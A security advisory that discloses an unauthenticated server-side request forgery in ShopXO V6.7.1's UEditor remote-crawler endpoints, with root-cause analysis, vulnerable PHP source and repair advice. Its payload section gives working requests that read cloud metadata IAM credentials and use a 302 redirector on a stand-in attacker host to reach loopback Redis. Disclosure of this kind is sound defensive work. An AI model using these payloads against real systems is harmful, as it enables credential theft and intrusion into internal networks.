# Gong Fuxiang ShopXO V6.7.1 extend/base/Uploader.php Unauthenticated Server-Side Request Forgery via Incomplete IP Filter in UEditor Remote Crawler

# NAME OF AFFECTED PRODUCT(S)

- ShopXO

## Vendor Homepage

- https://www.shopxo.net/

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- yunyan05

## Vulnerable File

- extend/base/Uploader.php

## VERSION(S)

- V6.7.1

## Software Link

- https://github.com/gongfuxiang/shopxo/releases/tag/v6.7.1

# PROBLEM TYPE

## Vulnerability Type

- Server-Side Request Forgery via Incomplete IP Range Filter (CWE-918 + CWE-1188)

## Root Cause

- A pre-authentication Server-Side Request Forgery vulnerability was identified within the `extend/base/Uploader.php` file (`saveRemote()` method) of the ShopXO project. The UEditor remote crawler endpoints (`action=catchimage` / `catchvideo` / `catchfile`, reachable through both `app/index/controller/Ueditor.php` and `app/api/controller/Ueditor.php`) accept an attacker-controlled URL list in the `source[]` parameter and fetch each entry with server-side cURL. The only host validation performed is `filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)`, which rejects RFC1918 private space only. Four independent flaws are stacked:
  1. `FILTER_FLAG_NO_RES_RANGE` is not set, so reserved ranges such as `127.0.0.0/8` (loopback), `169.254.0.0/16` (link-local / cloud metadata service), `0.0.0.0/8`, IPv6 `::1` and `fe80::/10` are not rejected. This is functionally identical to the well-known incomplete-fix pattern of CVE-2024-6524.
  2. The host-extraction regex `(^https*:\/\/[^:\/]+)` discards the port component, so the validated host is reused for the request regardless of the destination port (6379, 8080, 9200, 9000, 11211, 27017, etc.).
  3. The downstream cURL helper `CurlGet()` in `app/common.php` sets `CURLOPT_FOLLOWLOCATION=true` unconditionally, so even when the immediate hostname resolves to a public IP, an attacker-controlled HTTP 302 can redirect the request to an internal target — the validated IP is never re-checked after the redirect.
  4. The controllers `app/index/controller/Ueditor.php::Index` and `app/api/controller/Ueditor.php::Index` are reachable without authentication; the parent `Common` controller only calls `UserService::LoginUserInfo()` to populate `$this->user` and does not enforce a login.

## Impact

- Exploiting this vulnerability allows an unauthenticated remote attacker to coerce the ShopXO server into issuing arbitrary HTTP/HTTPS requests to any host it can reach on the network, including the loopback interface, link-local cloud metadata services (`169.254.169.254`) and internal-only management endpoints. The body of each fetched response is written to the public attachment directory (`/static/upload/...`) and its URL is returned in the JSON response, so the SSRF primitive is read-out, not blind: an attacker can retrieve cloud IAM temporary credentials, Redis / Elasticsearch / Consul banners and internal admin HTML, and can use the redirect-bypass primitive (flaw #3) to interact with services that would otherwise be blocked. On typical cloud deployments this leads to credential theft and lateral movement; on bare-metal deployments it exposes internal-only management surfaces and enables port discovery across the internal network.

# DESCRIPTION

- During the security assessment of ShopXO V6.7.1 (release 2025-10-28), I identified a critical unauthenticated Server-Side Request Forgery vulnerability in `extend/base/Uploader.php::saveRemote()`. The vendor introduced an IP filter in the 6.5.x branch to address the historical CVE-2024-6524 (`source` parameter SSRF, fixed-version annotation `<=6.1.0`), but the fix uses only `FILTER_FLAG_NO_PRIV_RANGE` and therefore leaves loopback, link-local and other reserved ranges reachable. The crawler entry points are exposed through both the public front-end (`/index.php?s=index/ueditor/index`) and the API (`/index.php?s=api/ueditor/index`) without any login requirement, and the downstream cURL transport follows HTTP redirects, so an attacker-controlled public redirector can be used to bypass the IP check entirely. The fetched response body is persisted as an attachment under `/static/upload/...` and its URL is returned in the JSON response, which converts the SSRF into a read-out primitive sufficient to retrieve cloud IAM credentials from the EC2 / Aliyun metadata endpoint. Immediate corrective actions are essential to safeguard system security and protect the network adjacent to a ShopXO instance.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability location:

- `extend/base/Uploader.php` :: `saveRemote()` (lines 302–345)
- `app/common.php` :: `CurlGet()` (lines 3604–3621, `CURLOPT_FOLLOWLOCATION=true`)
- `app/index/controller/Ueditor.php` :: `Index()` (front-end entry, no auth)
- `app/api/controller/Ueditor.php` :: `Index()` (API entry, no auth)
- `app/service/UeditorService.php` :: `ActionCrawler()` (lines 84–90, 537–546 — writes the fetched body to a public attachment URL)
- Vulnerable parameters in the request: `action` (one of `catchimage` / `catchvideo` / `catchfile`), `source[]`

Vulnerable source (V6.7.1, the IP-filter excerpt that constitutes the incomplete fix):

```php
private function saveRemote()
{
    $remoteUrl = htmlspecialchars($this->fileField);
    $remoteUrl = str_replace('&amp;', '&', $remoteUrl);

    $ext = explode('?', strtolower(strrchr($remoteUrl, '.')));
    if (!$this->checkType($ext[0])) { /* ... */ return; }
    if (strpos($remoteUrl, 'http') !== 0) { /* ... */ return; }

    preg_match('/(^https*:\/\/[^:\/]+)/', $remoteUrl, $matches);          // [flaw 2] port discarded
    $host_with_protocol = count($matches) > 1 ? $matches[1] : '';
    if (!filter_var($host_with_protocol, FILTER_VALIDATE_URL)) { /* ... */ return; }

    preg_match('/^https*:\/\/(.+)/', $host_with_protocol, $matches);
    $host_without_protocol = count($matches) > 1 ? $matches[1] : '';

    $ip = gethostbyname($host_without_protocol);
    // [flaw 1] NO_PRIV_RANGE only — NO_RES_RANGE missing → 127/8, 169.254/16, 0/8, ::1, fe80::/10 all reachable
    if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
        $this->stateInfo = $this->getStateErrorInfo('invalid_ip');
        return;
    }

    $reponse = RequestGet($remoteUrl);                                    // [flaw 3] CurlGet → CURLOPT_FOLLOWLOCATION=true
    // ...
    if (!(file_put_contents($this->filePath, $reponse) && file_exists($this->filePath))) { /* ... */ }
}
```

`FILTER_FLAG_NO_PRIV_RANGE` only rejects 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 and IPv6 fc00::/7. The following ranges, guarded by the separate `FILTER_FLAG_NO_RES_RANGE` flag that the vendor did not set, remain reachable from this endpoint:

| Range | Why it matters | Blocked by `NO_PRIV_RANGE` |
|---|---|---|
| `127.0.0.0/8` | Loopback — local services on the ShopXO host | No |
| `169.254.0.0/16` | AWS / Aliyun / Azure instance metadata | No |
| `0.0.0.0/8` | "This network" — kernel routes to local interfaces | No |
| `192.0.2.0/24`, `198.18.0.0/15` | TEST-NET, benchmarking — used as redirector targets | No |
| `::1`, `fe80::/10` | IPv6 loopback and link-local | No |

The downstream transport adds a second bypass: `CurlGet()` in `app/common.php:3604` sets `CURLOPT_FOLLOWLOCATION=true`, so even if `FILTER_FLAG_NO_RES_RANGE` were added in a future patch, an attacker can host `http://evil.example.com/x.png` returning `302 Location: http://127.0.0.1:6379/`. The hostname resolves to a public IP at validation time and is then redirected to loopback at fetch time, because the validated IP is never re-checked after the redirect.

The crawler entry points are reached via either of two equivalent paths and do not require a session cookie:

```
/index.php?s=index/ueditor/index&action=catchimage&source[0]=<URL>
/index.php?s=api/ueditor/index&action=catchimage&source[0]=<URL>
```

The fetched response body is persisted to a public attachment URL and the URL is returned in the JSON response, which turns the SSRF into a read-out primitive:

```php
// app/service/UeditorService.php:537-546
$data = $up->getFileInfo();
if(isset($data['state']) && $data['state'] == 'SUCCESS')
{
    $data['type'] = $attachment_type;
    $data['category_id'] = self::$category_id;
    $ret = AttachmentService::AttachmentAdd($data);
    if($ret['code'] == 0)
    {
        $ret['data']['source'] = htmlspecialchars($url);
        array_push($list, $ret['data']);
    }
}
```

## Payload:

```makefile
Step 1 — confirm the SSRF primitive with an out-of-band DNS canary
         (no authentication, no cookie required):

    POST /shopxo/index.php?s=api/ueditor&action=catchimage HTTP/1.1
    Host: <target>
    Content-Type: application/x-www-form-urlencoded

    source[0]=http://<dnslog-token>.dnslog.cn/png/x.png

Step 2 — abuse the incomplete filter to read cloud instance metadata
         (returned to the attacker via the public attachment URL in the JSON response):

    POST /shopxo/index.php?s=api/ueditor&action=catchfile HTTP/1.1
    Host: <target>
    Content-Type: application/x-www-form-urlencoded

    source[0]=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

Step 3 — alternative bypass using an attacker-controlled HTTP 302 redirector,
         effective even if the vendor later adds FILTER_FLAG_NO_RES_RANGE:

    Attacker hosts http://evil.example.com/x.png returning:
        HTTP/1.1 302 Found
        Location: http://127.0.0.1:6379/INFO

    POST /shopxo/index.php?s=index/ueditor&action=catchimage HTTP/1.1
    Host: <target>
    Content-Type: application/x-www-form-urlencoded

    source[0]=http://evil.example.com/x.png
```

## Vulnerability Request Packet

```makefile
POST /shopxo/index.php?s=api/ueditor&action=catchimage HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Connection: close

source[0]=http://ssrf-test-01.ehc25e.dnslog.cn/png/x.png
```

Server response (HTTP 200) — the JSON `data[]` array contains the attachment record proving the server-side fetch was issued and the response body was persisted under `/static/upload/...`:

```http
HTTP/1.1 200 OK
Date: Fri, 15 May 2026 01:35:00 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
X-Powered-By: PHP/7.3.4
Cache-Control: no-store, no-cache, must-revalidate
Content-Type: application/json; charset=utf-8
Content-Length: 48
Connection: close

{"msg":"","code":0,"data":[ ... ]}
```

The corresponding DNSLog console records the inbound DNS lookup of the canary hostname from the ShopXO server's public egress IP (the lookup must be resolved before cURL can issue the HTTP request, so its presence is an unforgeable proof that the server-side fetch was performed):

## The following are screenshots of the request / response captured in Burp Repeater and the DNSLog console confirming the SSRF primitive:

![Step 1 — POST /shopxo/index.php?s=api/ueditor&action=catchimage with source[]=http://ssrf-test-01.ehc25e.dnslog.cn/png/x.png returns HTTP 200 with code:0 (server-side fetch issued)](./1.png)

![Step 2 — DNSLog console shows the canary hostname ssrf-test-01.ehc25e.dnslog.cn resolved from the ShopXO server's egress IPs (222.246.129.x / 59.51.94.x) — out-of-band confirmation that the server-side HTTP request was performed by ShopXO, not by the attacker's browser](./2.png)

After the request above, an attacker can repeat the request with `source[0]=http://127.0.0.1:<port>/...` (or, on cloud-hosted deployments, `http://169.254.169.254/latest/meta-data/...`) to interact with internal services and retrieve their responses through the JSON-returned attachment URL — full Server-Side Request Forgery with read-out is achieved.

# Suggested repair

1. **Combine `NO_PRIV_RANGE` and `NO_RES_RANGE` and add an explicit deny list.**
   In `extend/base/Uploader.php::saveRemote()`, replace `FILTER_FLAG_NO_PRIV_RANGE` with `FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE` and add a hard-coded reject for `127./8`, `169.254./16`, `0.0./8`, `::1`, `fe80::/10` so that future PHP behaviour changes cannot silently re-open these ranges. Resolve every A/AAAA record of the host (`gethostbynamel()` / `dns_get_record()`) and reject if any of them fail the check.

2. **Pin the resolved IP through the redirect chain.**
   Set `CURLOPT_FOLLOWLOCATION=false` in `CurlGet()` for the `saveRemote()` code path, or — if redirects must be supported — implement a custom `CURLOPT_OPENSOCKETFUNCTION` that re-validates the destination IP on every redirect hop. The current behaviour, where the validated IP is never re-checked after a 302, is itself a complete SSRF bypass.

3. **Enforce a scheme and port whitelist.**
   Reject any URL whose scheme is not `http` or `https` and whose port is not 80 or 443 (or 8080 / 8443 if explicitly desired). Use `parse_url()` to obtain the port reliably rather than relying on a regex that strips the port component.

4. **Authenticate the crawler endpoints.**
   The `catchimage` / `catchvideo` / `catchfile` actions of `app/index/controller/Ueditor.php` and `app/api/controller/Ueditor.php` must require an authenticated administrative session. UEditor's remote-crawler feature is an administrative content-management primitive, not a public one, and exposing it pre-authentication is the root cause of the impact.

5. **Apply rate-limiting and audit logging on the crawler endpoint.**
   Throttle by source IP and by destination host, and log every fetch attempt (source IP, request URL, resolved IP, HTTP status, response size, resulting attachment URL) so that SSRF probing is detectable.
